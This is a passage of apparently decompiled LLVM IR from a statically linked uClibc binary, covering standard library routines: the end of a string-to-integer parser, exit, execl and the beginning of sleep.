  %v3_80510a1 = zext i8 %v2_80510a1 to i32
  %v5_80510a1 = and i32 %v3_805106a.lcssa, -256
  %v6_80510a1 = or i32 %v5_80510a1, %v3_80510a1
  %v1_80510a3 = or i32 %v6_80510a1, 32
  %v3_80510a3 = trunc i32 %v1_80510a3 to i8
  store i32 %v1_80510a3, i32* %eax.global-to-local, align 4
  %v10_80510a6 = icmp eq i8 %v3_80510a3, 120
  %v1_80510a8 = icmp eq i1 %v10_80510a6, false
  br i1 %v1_80510a8, label %dec_label_pc_80510ad, label %dec_label_pc_80510aa

dec_label_pc_80510aa:                             ; preds = %dec_label_pc_805109b
  %v2_80510aa = mul i32 %v1_805109c, 2
  store i32 %v2_80510aa, i32* %esi.global-to-local, align 4
  %v1_80510ac = add i32 %v0_805109b, 2
  store i32 %v1_80510ac, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80510ad

dec_label_pc_80510ad:                             ; preds = %dec_label_pc_805109b, %dec_label_pc_8051093, %dec_label_pc_80510aa
  %v0_80510d612 = phi i32 [ %v1_805109b, %dec_label_pc_805109b ], [ %v0_805109b, %dec_label_pc_8051093 ], [ %v1_80510ac, %dec_label_pc_80510aa ]
  %v0_805112d20 = phi i32 [ %v1_805109b, %dec_label_pc_805109b ], [ %v4_805105d, %dec_label_pc_8051093 ], [ %v1_805109b, %dec_label_pc_80510aa ]
  %v0_80510ad = phi i32 [ %v1_805109c, %dec_label_pc_805109b ], [ %v1_8051093, %dec_label_pc_8051093 ], [ %v2_80510aa, %dec_label_pc_80510aa ]
  %v7_80510b0 = icmp sgt i32 %v0_80510ad, 16
  br i1 %v7_80510b0, label %dec_label_pc_80510b2, label %dec_label_pc_80510b7

dec_label_pc_80510b2:                             ; preds = %dec_label_pc_80510ad
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80510b7

dec_label_pc_80510b7:                             ; preds = %dec_label_pc_80510ad, %dec_label_pc_8051089, %dec_label_pc_80510b2
  %v0_805112d21 = phi i32 [ %v0_805112d20, %dec_label_pc_80510ad ], [ %v4_805105d, %dec_label_pc_8051089 ], [ %v0_805112d20, %dec_label_pc_80510b2 ]
  %v0_80510d613 = phi i32 [ %v0_80510d612, %dec_label_pc_80510ad ], [ %v0_805109b, %dec_label_pc_8051089 ], [ %v0_80510d612, %dec_label_pc_80510b2 ]
  %v0_80510c6 = phi i32 [ %v0_80510ad, %dec_label_pc_80510ad ], [ %arg3, %dec_label_pc_8051089 ], [ 16, %dec_label_pc_80510b2 ]
  %v1_80510b7 = add i32 %v0_80510c6, -2
  store i32 %v1_80510b7, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_80510bf = icmp ugt i32 %v1_80510b7, 34
  br i1 %v6_80510bf, label %dec_label_pc_8051122, label %dec_label_pc_80510c1

dec_label_pc_80510c1:                             ; preds = %dec_label_pc_80510b7
  %div = udiv i32 -1, %v0_80510c6
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_80510c6
  %v1_80510c8 = trunc i32 %tmp38 to i8
  store i32 0, i32* @edx, align 4
  %v4_8051102 = urem i32 %arg4, 256
  br label %dec_label_pc_80510d6

dec_label_pc_80510d4:                             ; preds = %dec_label_pc_8051118, %dec_label_pc_8051102
  %v4_80510d6.pre = phi i32 [ %v1_80510ec, %dec_label_pc_8051118 ], [ %v4_80510d6.pre.pre, %dec_label_pc_8051102 ]
  %v0_80510d4 = phi i32 [ %v1_80510f3, %dec_label_pc_8051118 ], [ %v0_80510d4.pre, %dec_label_pc_8051102 ]
  br label %dec_label_pc_80510d6

dec_label_pc_80510d6:                             ; preds = %dec_label_pc_80510c1, %dec_label_pc_80510d4
  %v0_805112d19 = phi i32 [ %v0_805112d21, %dec_label_pc_80510c1 ], [ %v0_80510d4, %dec_label_pc_80510d4 ]
  %v0_80510f3 = phi i32 [ %v0_80510d613, %dec_label_pc_80510c1 ], [ %v0_80510d4, %dec_label_pc_80510d4 ]
  %v4_80510d6 = phi i32 [ %div, %dec_label_pc_80510c1 ], [ %v4_80510d6.pre, %dec_label_pc_80510d4 ]
  %v1_80510d6 = inttoptr i32 %v0_80510f3 to i8*
  %v2_80510d6 = load i8, i8* %v1_80510d6, align 1
  %v3_80510d6 = zext i8 %v2_80510d6 to i32
  %v5_80510d6 = and i32 %v4_80510d6, -256
  %v6_80510d6 = or i32 %v3_80510d6, %v5_80510d6
  store i32 %v6_80510d6, i32* %eax.global-to-local, align 4
  %v1_80510d8 = add i32 %v6_80510d6, -48
  store i32 %v1_80510d8, i32* @ecx, align 4
  %v1_80510db = trunc i32 %v1_80510d8 to i8
  %tmp55 = icmp ult i8 %v1_80510db, 10
  br i1 %tmp55, label %dec_label_pc_80510ec, label %dec_label_pc_80510e0

dec_label_pc_80510e0:                             ; preds = %dec_label_pc_80510d6
  %v1_80510e0 = or i32 %v6_80510d6, 32
  %v3_80510e0 = trunc i32 %v1_80510e0 to i8
  store i32 %v1_80510e0, i32* %eax.global-to-local, align 4
  %v1_80510e3 = and i32 %v1_80510d8, -256
  %v2_80510e3 = or i32 %v1_80510e3, 40
  store i32 %v2_80510e3, i32* @ecx, align 4
  %tmp56 = icmp ult i8 %v3_80510e0, 97
  br i1 %tmp56, label %dec_label_pc_80510ec, label %dec_label_pc_80510e9

dec_label_pc_80510e9:                             ; preds = %dec_label_pc_80510e0
  %v1_80510e9 = add i32 %v1_80510e0, -87
  store i32 %v1_80510e9, i32* @ecx, align 4
  br label %dec_label_pc_80510ec

dec_label_pc_80510ec:                             ; preds = %dec_label_pc_80510e0, %dec_label_pc_80510d6, %dec_label_pc_80510e9
  %v0_805111b = phi i32 [ %v2_80510e3, %dec_label_pc_80510e0 ], [ %v1_80510d8, %dec_label_pc_80510d6 ], [ %v1_80510e9, %dec_label_pc_80510e9 ]
  %v1_80510ec = urem i32 %v0_805111b, 256
  store i32 %v1_80510ec, i32* %eax.global-to-local, align 4
  %v1_80510ef = load i32, i32* %esi.global-to-local, align 4
  %v2_80510ef = sub i32 %v1_80510ec, %v1_80510ef
  %v10_80510ef = and i32 %v2_80510ef, %v1_80510ef
  %v11_80510ef = icmp slt i32 %v10_80510ef, 0
  %v13_80510ef = icmp slt i32 %v2_80510ef, 0
  %v2_80510f1 = icmp eq i1 %v13_80510ef, %v11_80510ef
  br i1 %v2_80510f1, label %dec_label_pc_8051122, label %dec_label_pc_80510f3

dec_label_pc_80510f3:                             ; preds = %dec_label_pc_80510ec
  %v1_80510f3 = add i32 %v0_80510f3, 1
  store i32 %v1_80510f3, i32* %ebx.global-to-local, align 4
  %v0_80510f4 = load i32, i32* @edx, align 4
  %tmp57 = icmp ugt i32 %v0_80510f4, %div
  br i1 %tmp57, label %dec_label_pc_8051102, label %dec_label_pc_80510fa

dec_label_pc_80510fa:                             ; preds = %dec_label_pc_80510f3
  %v15_80510f4 = icmp eq i32 %v0_80510f4, %div
  %v1_80510fa = icmp eq i1 %v15_80510f4, false
  br i1 %v1_80510fa, label %dec_label_pc_8051118, label %dec_label_pc_80510fc

dec_label_pc_80510fc:                             ; preds = %dec_label_pc_80510fa
  %v1_80510fc = trunc i32 %v0_805111b to i8
  %tmp58 = icmp ugt i8 %v1_80510fc, %v1_80510c8
  br i1 %tmp58, label %dec_label_pc_8051102, label %dec_label_pc_8051118

dec_label_pc_8051102:                             ; preds = %dec_label_pc_80510fc, %dec_label_pc_80510f3
  store i32 %v4_8051102, i32* %eax.global-to-local, align 4
  %v0_8051106 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051106 = and i32 %v0_8051106, %v4_8051102
  store i32 %v2_8051106, i32* %ebp.global-to-local, align 4
  %v1_8051108 = call i32 @__errno_location(i32 %div)
  store i32 %v1_8051108, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v1_8051110 = inttoptr i32 %v1_8051108 to i32*
  store i32 34, i32* %v1_8051110, align 4
  %v0_80510d4.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_80510d6.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510d4

dec_label_pc_8051118:                             ; preds = %dec_label_pc_80510fc, %dec_label_pc_80510fa
  %v4_8051118 = mul i32 %v0_80510f4, %v1_80510ef
  store i32 %v1_80510ec, i32* %eax.global-to-local, align 4
  %v2_805111e = add i32 %v4_8051118, %v1_80510ec
  store i32 %v2_805111e, i32* @edx, align 4
  br label %dec_label_pc_80510d4

dec_label_pc_8051122:                             ; preds = %dec_label_pc_80510ec, %dec_label_pc_80510b7
  %v0_805112d = phi i32 [ %v0_805112d21, %dec_label_pc_80510b7 ], [ %v0_805112d19, %dec_label_pc_80510ec ]
  %stack_var_-24.0 = phi i32 [ %tmp27, %dec_label_pc_80510b7 ], [ %div, %dec_label_pc_80510ec ]
  %v4_8051122 = icmp eq i32 %arg2, 0
  br i1 %v4_8051122, label %dec_label_pc_805112f, label %dec_label_pc_8051129

dec_label_pc_8051129:                             ; preds = %dec_label_pc_8051122
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_805112d = inttoptr i32 %arg2 to i32*
  store i32 %v0_805112d, i32* %v2_805112d, align 4
  br label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_8051122, %dec_label_pc_8051129
  %v0_805112f = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_805112f, i32* %eax.global-to-local, align 4
  %v1_8051131 = trunc i32 %v0_805112f to i8
  %v6_8051131 = icmp eq i8 %v1_8051131, 0
  %v2_8051133 = zext i1 %v6_8051131 to i32
  %v1_80511354 = or i32 %v2_8051133, -2147483648
  store i32 %v1_80511354, i32* %ebx.global-to-local, align 4
  %v5_805113b = icmp eq i8 %tmp37, 0
  br i1 %v5_805113b, label %dec_label_pc_8051153, label %dec_label_pc_8051142

dec_label_pc_8051142:                             ; preds = %dec_label_pc_805112f
  %v0_8051142 = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_8051142, %v1_80511354
  br i1 %tmp59, label %dec_label_pc_8051146, label %dec_label_pc_8051153

dec_label_pc_8051146:                             ; preds = %dec_label_pc_8051142
  %v1_8051146 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8051146, i32* %eax.global-to-local, align 4
  %v0_805114b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805114b, i32* @edx, align 4
  %v1_805114d = inttoptr i32 %v1_8051146 to i32*
  store i32 34, i32* %v1_805114d, align 4
  %v0_8051153.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051153

dec_label_pc_8051153:                             ; preds = %dec_label_pc_8051142, %dec_label_pc_805112f, %dec_label_pc_8051146
  %v0_8051153 = phi i32 [ %v0_805112f, %dec_label_pc_8051142 ], [ %v0_805112f, %dec_label_pc_805112f ], [ %v0_8051153.pre, %dec_label_pc_8051146 ]
  store i32 %v0_8051153, i32* %eax.global-to-local, align 4
  %v3_8051155 = trunc i32 %v0_8051153 to i8
  %v4_8051155 = icmp eq i8 %v3_8051155, 0
  %v0_805115e.pre = load i32, i32* @edx, align 4
  br i1 %v4_8051155, label %dec_label_pc_805115b, label %dec_label_pc_8051159

dec_label_pc_8051159:                             ; preds = %dec_label_pc_8051153
  %v1_8051159 = sub i32 0, %v0_805115e.pre
  store i32 %v1_8051159, i32* @edx, align 4
  br label %dec_label_pc_805115b

dec_label_pc_805115b:                             ; preds = %dec_label_pc_8051153, %dec_label_pc_8051159
  %v0_805115e = phi i32 [ %v1_8051159, %dec_label_pc_8051159 ], [ %v0_805115e.pre, %dec_label_pc_8051153 ]
  store i32 %v0_805115e, i32* %eax.global-to-local, align 4
  %v2_8051160 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051160, i32* @ebx, align 4
  ret i32 %v0_805115e

; uselistorder directives
  uselistorder i32 %v0_805115e, { 1, 0 }
  uselistorder i32 %v0_8051153, { 1, 0 }
  uselistorder i32 %v0_80510f4, { 0, 2, 1 }
  uselistorder i32 %v1_80510f3, { 1, 0 }
  uselistorder i32 %v2_80510ef, { 1, 0 }
  uselistorder i32 %v1_80510ec, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_805111b, { 1, 0 }
  uselistorder i32 %v0_80510d4, { 1, 0 }
  uselistorder i32 %v4_8051102, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_80510c6, { 1, 0, 2 }
  uselistorder i32 %v2_80510aa, { 1, 0 }
  uselistorder i32 %v1_80510a3, { 1, 0 }
  uselistorder i32 %v1_805109c, { 1, 0, 2 }
  uselistorder i32 %v0_805109b, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_805106a.lcssa, { 1, 0 }
  uselistorder i32 %v0_8051069.lcssa, { 1, 0 }
  uselistorder i32 %v1_8051069, { 0, 3, 2, 1 }
  uselistorder i32 %v4_805105d, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8051057, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 36, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805115b, { 1, 0 }
  uselistorder label %dec_label_pc_8051153, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805112f, { 1, 0 }
  uselistorder label %dec_label_pc_80510ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80510d6, { 1, 0 }
  uselistorder label %dec_label_pc_80510b7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80510ad, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051089, { 1, 0 }
  uselistorder label %dec_label_pc_8051088, { 1, 0 }
  uselistorder label %dec_label_pc_8051069, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_805117b = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805117b, i32* @ebx, align 4
  %v2_8051180 = call i32 @__pthread_return_void(i32 %v2_805117b, i32 134550911)
  %v1_805118c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a100.254 to i32))
  %v0_8051191 = load i32, i32* @global_var_80603a4.255, align 4
  store i32 %v0_8051191, i32* @eax, align 4
  %v1_8051199 = icmp eq i32 %v0_8051191, 0
  br i1 %v1_8051199, label %dec_label_pc_80511a6, label %dec_label_pc_805119d

dec_label_pc_805119d:                             ; preds = %entry
  %v0_80511a0 = load i32, i32* @esi, align 4
  %v1_80511a1 = call i32 @unknown_0(i32 %v0_80511a0)
  store i32 %v1_80511a1, i32* @eax, align 4
  br label %dec_label_pc_80511a6

dec_label_pc_80511a6:                             ; preds = %entry, %dec_label_pc_805119d
  %v2_80511ab = call i32 @__pthread_return_void(i32 %v2_805117b, i32 1)
  %v0_80511b0 = call i32 @__GI___uClibc_fini()
  %v0_80511c1 = call i32 @_stdio_term()
  %v0_80511c9 = load i32, i32* @esi, align 4
  %v1_80511ca = call i32 @__GI__exit(i32 %v0_80511c9)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 3, 0, 6, 5, 2, 1, 10, 9, 8, 7, 4 }
  uselistorder label %dec_label_pc_80511a6, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80511d4 = load i32, i32* @ebx, align 4
  store i32 %v0_80511d4, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80511d7 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80511d7, i32* %eax.global-to-local, align 4
  %v12_80511da = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80511e0

dec_label_pc_80511e0:                             ; preds = %dec_label_pc_80511e0, %entry
  %v0_80511e3 = phi i32 [ 0, %entry ], [ %v1_80511e3, %dec_label_pc_80511e0 ]
  %stack_var_-16.0 = phi i32 [ %v2_80511d7, %entry ], [ %v1_80511e4, %dec_label_pc_80511e0 ]
  %v1_80511e3 = add i32 %v0_80511e3, 1
  store i32 %v1_80511e3, i32* %esi.global-to-local, align 4
  %v1_80511e4 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80511e4, i32* %eax.global-to-local, align 4
  %v1_80511ea = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80511ea = load i32, i32* %v1_80511ea, align 4
  %v3_80511ea = icmp eq i32 %v2_80511ea, 0
  %v1_80511ed = icmp eq i1 %v3_80511ea, false
  br i1 %v1_80511ed, label %dec_label_pc_80511e0, label %dec_label_pc_80511ef

dec_label_pc_80511ef:                             ; preds = %dec_label_pc_80511e0
  %v1_80511ef = mul i32 %v1_80511e3, 4
  %v2_80511ef = add i32 %v1_80511ef, 34
  %v1_80511f6 = and i32 %v2_80511ef, -16
  %v2_80511f9 = sub i32 %v12_80511da, %v1_80511f6
  %v1_80511fe = add i32 %v2_80511f9, 15
  %v1_8051202 = and i32 %v1_80511fe, -16
  store i32 %v1_8051202, i32* @ebx, align 4
  store i32 %v1_8051202, i32* %ecx.global-to-local, align 4
  %v2_8051207 = inttoptr i32 %v1_8051202 to i32*
  store i32 %arg2, i32* %v2_8051207, align 16
  store i32 %v2_80511d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805120f

dec_label_pc_805120f:                             ; preds = %dec_label_pc_805120f, %dec_label_pc_80511ef
  %stack_var_-16.1 = phi i32 [ %v2_80511d7, %dec_label_pc_80511ef ], [ %v1_8051216, %dec_label_pc_805120f ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_8051212 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051212 = add i32 %v0_8051212, 4
  store i32 %v1_8051212, i32* %ecx.global-to-local, align 4
  %v0_8051215 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051215 = add i32 %v0_8051215, -1
  %v8_8051215 = icmp eq i32 %v1_8051215, 0
  store i32 %v1_8051215, i32* %esi.global-to-local, align 4
  %v1_8051216 = add i32 %stack_var_-16.1, 4
  %v1_805121c = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_805121c = load i32, i32* %v1_805121c, align 4
  store i32 %v2_805121c, i32* %eax.global-to-local, align 4
  %v2_805121e = inttoptr i32 %v1_8051212 to i32*
  store i32 %v2_805121c, i32* %v2_805121e, align 4
  %v1_8051220 = icmp eq i1 %v8_8051215, false
  br i1 %v1_8051220, label %dec_label_pc_805120f, label %dec_label_pc_8051222

dec_label_pc_8051222:                             ; preds = %dec_label_pc_805120f
  %v0_8051222 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051222 = load i32, i32* @esp, align 4
  %v2_8051222 = add i32 %v1_8051222, -4
  %v3_8051222 = inttoptr i32 %v2_8051222 to i32*
  store i32 %v0_8051222, i32* %v3_8051222, align 4
  %v0_8051223 = load i32, i32* @global_var_80603ac.256, align 4
  %v2_8051223 = add i32 %v1_8051222, -8
  %v3_8051223 = inttoptr i32 %v2_8051223 to i32*
  store i32 %v0_8051223, i32* %v3_8051223, align 4
  %v0_8051229 = load i32, i32* @ebx, align 4
  %v2_8051229 = add i32 %v1_8051222, -12
  %v3_8051229 = inttoptr i32 %v2_8051229 to i32*
  store i32 %v0_8051229, i32* %v3_8051229, align 4
  %v5_805122a = add i32 %v1_8051222, -16
  %v6_805122a = inttoptr i32 %v5_805122a to i32*
  store i32 %arg1, i32* %v6_805122a, align 4
  %v1_805122d = inttoptr i32 %v1_8051216 to i8*
  %v2_805122d = call i32 @__GI_execve(i8* %v1_805122d)
  store i32 %v2_805122d, i32* %eax.global-to-local, align 4
  %v2_8051235 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051235, i32* @ebx, align 4
  ret i32 %v2_805122d

; uselistorder directives
  uselistorder i32 %v1_8051215, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80511e4, { 1, 0 }
  uselistorder i32 %v1_80511e3, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80511d7, { 0, 2, 1, 3 }
}

define i32 @sleep() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_805123d = load i32, i32* @edi, align 4
  %v0_805123e = load i32, i32* @esi, align 4
  %v0_805123f = load i32, i32* @ebx, align 4
  %v15_8051240 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v1_8051252 = icmp eq i32 %tmp11, 0
  %v1_8051254 = icmp eq i1 %v1_8051252, false
  br i1 %v1_8051254, label %dec_label_pc_8051266.preheader, label %dec_label_pc_80513b3

dec_label_pc_8051266.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805125b

dec_label_pc_805125b:                             ; preds = %dec_label_pc_805125b.dec_label_pc_805125b_crit_edge, %dec_label_pc_8051266.preheader
  %v0_805125b = phi i32 [ %v15_8051240, %dec_label_pc_8051266.preheader ], [ %v0_805125b.pre, %dec_label_pc_805125b.dec_label_pc_805125b_crit_edge ]
  %v1_805126627 = phi i32 [ 31, %dec_label_pc_8051266.preheader ], [ %v1_8051266, %dec_label_pc_805125b.dec_label_pc_805125b_crit_edge ]
  %v2_805125b = mul i32 %v1_805126627, 4
  %v3_805125b = add i32 %v2_805125b, 292
  %v4_805125b = add i32 %v3_805125b, %v0_805125b
  %v5_805125b = inttoptr i32 %v4_805125b to i32*
  store i32 0, i32* %v5_805125b, align 4
  %v0_8051266.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051266 = add i32 %v0_8051266.pre, -1
  %v9_8051266 = icmp slt i32 %v1_8051266, 0
  store i32 %v1_8051266, i32* %eax.global-to-local, align 4
  %v1_8051267 = icmp eq i1 %v9_8051266, false
  br i1 %v1_8051267, label %dec_label_pc_805125b.dec_label_pc_805125b_crit_edge, label %dec_label_pc_8051269

dec_label_pc_805125b.dec_label_pc_805125b_crit_edge: ; preds = %dec_label_pc_805125b
  %v0_805125b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805125b

dec_label_pc_8051269:                             ; preds = %dec_label_pc_805125b
  store i32 %tmp11, i32* %stack_var_-24, align 4
  %v2_805127f = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805127f, i32* @ebx, align 4
  store i32 %v2_805127f, i32* %stack_var_-460, align 4
  %v4_8051287 = call i32 @__sigaddset(i32 %v2_805127f, i32 17, i32 %v1_8051266, i32 %v1_8051266)
  store i32 %v4_8051287, i32* %eax.global-to-local, align 4
  %v2_805128f = icmp slt i32 %v4_8051287, 0
  br i1 %v2_805128f, label %dec_label_pc_80513b7, label %dec_label_pc_8051297

dec_label_pc_8051297:                             ; preds = %dec_label_pc_8051269
  %v2_8051298 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8051298, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80512a3 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80512a3 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80512a3, i32 %v2_8051298)
  store i32 %v4_80512a3, i32* %eax.global-to-local, align 4
  %v1_80512ab = icmp eq i32 %v4_80512a3, 0
  %v1_80512ad = icmp eq i1 %v1_80512ab, false
  br i1 %v1_80512ad, label %dec_label_pc_80513b7, label %dec_label_pc_80512b3

dec_label_pc_80512b3:                             ; preds = %dec_label_pc_8051297
  store i32 %v2_8051298, i32* %stack_var_-460, align 4
  %v4_80512b8 = call i32 @__sigismember(i32 %v2_8051298, i32 17, i32 %v4_80512a3, i32 %v4_80512a3)
  store i32 %v4_80512b8, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80512c5 = icmp eq i32 %v4_80512b8, 0
  br i1 %v1_80512c5, label %dec_label_pc_80512d9.preheader, label %dec_label_pc_8051381

dec_label_pc_80512d9.preheader:                   ; preds = %dec_label_pc_80512b3
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80512ce

dec_label_pc_80512ce:                             ; preds = %dec_label_pc_80512ce.dec_label_pc_80512ce_crit_edge, %dec_label_pc_80512d9.preheader
  %v0_80512ce = phi i32 [ %v15_8051240, %dec_label_pc_80512d9.preheader ], [ %v0_80512ce.pre, %dec_label_pc_80512ce.dec_label_pc_80512ce_crit_edge ]
  %v1_80512d926 = phi i32 [ 31, %dec_label_pc_80512d9.preheader ], [ %v1_80512d9, %dec_label_pc_80512ce.dec_label_pc_80512ce_crit_edge ]
  %v2_80512ce = mul i32 %v1_80512d926, 4
  %v3_80512ce = add i32 %v2_80512ce, 292
  %v4_80512ce = add i32 %v3_80512ce, %v0_80512ce
  %v5_80512ce = inttoptr i32 %v4_80512ce to i32*
  store i32 0, i32* %v5_80512ce, align 4
  %v0_80512d9.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80512d9 = add i32 %v0_80512d9.pre, -1
  %v9_80512d9 = icmp slt i32 %v1_80512d9, 0
  store i32 %v1_80512d9, i32* %edx.global-to-local, align 4
  %v1_80512da = icmp eq i1 %v9_80512d9, false
  br i1 %v1_80512da, label %dec_label_pc_80512ce.dec_label_pc_80512ce_crit_edge, label %dec_label_pc_80512dc

dec_label_pc_80512ce.dec_label_pc_80512ce_crit_edge: ; preds = %dec_label_pc_80512ce
  %v0_80512ce.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80512ce

dec_label_pc_80512dc:                             ; preds = %dec_label_pc_80512ce
  store i32 %v2_805127f, i32* %eax.global-to-local, align 4
  store i32 %v2_805127f, i32* %stack_var_-460, align 4
  %v4_80512e8 = call i32 @__sigaddset(i32 %v2_805127f, i32 17, i32 0, i32 0)
  store i32 %v4_80512e8, i32* %eax.global-to-local, align 4
  %v2_80512f0 = icmp slt i32 %v4_80512e8, 0
  br i1 %v2_80512f0, label %dec_label_pc_80513b7, label %dec_label_pc_80512f8

dec_label_pc_80512f8:                             ; preds = %dec_label_pc_80512dc
  %v2_80512f9 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80512f9, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8051302 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_80512f9)
  store i32 %v4_8051302, i32* %eax.global-to-local, align 4
  %v2_805130a = icmp slt i32 %v4_8051302, 0
  %v1_805130c = icmp eq i1 %v2_805130a, false
  br i1 %v1_805130c, label %dec_label_pc_8051336, label %dec_label_pc_805130e

dec_label_pc_805130e:                             ; preds = %dec_label_pc_80512f8
  %v0_805130e = load i32, i32* %stack_var_-460, align 4
  %v1_805130e = call i32 @__errno_location(i32 %v0_805130e)
  store i32 %v1_805130e, i32* %eax.global-to-local, align 4
  store i32 %v1_805130e, i32* @ebx, align 4
  %v1_8051315 = inttoptr i32 %v1_805130e to i32*
  %v2_8051315 = load i32, i32* %v1_8051315, align 4
  store i32 %v2_8051315, i32* @esi, align 4
  store i32 %v2_8051298, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8051324 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8051324 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8051324, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805132f = load i32, i32* @esi, align 4
  %v1_805132f = load i32, i32* @ebx, align 4
  %v2_805132f = inttoptr i32 %v1_805132f to i32*
  store i32 %v0_805132f, i32* %v2_805132f, align 4
  %v0_80513c4.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80513ba

dec_label_pc_8051336:                             ; preds = %dec_label_pc_80512f8
  %v3_8051336 = load i32, i32* %stack_var_-420, align 4
  %v12_8051336 = icmp eq i32 %v3_8051336, 1
  %v2_8051342 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051342, i32* @ebx, align 4
  %v1_8051349 = icmp eq i1 %v12_8051336, false
  br i1 %v1_8051349, label %dec_label_pc_8051370, label %dec_label_pc_805134b

dec_label_pc_805134b:                             ; preds = %dec_label_pc_8051336
  store i32 %v2_8051342, i32* %stack_var_-460, align 4
  %v2_805134f = bitcast i32* %stack_var_-24 to %timespec*
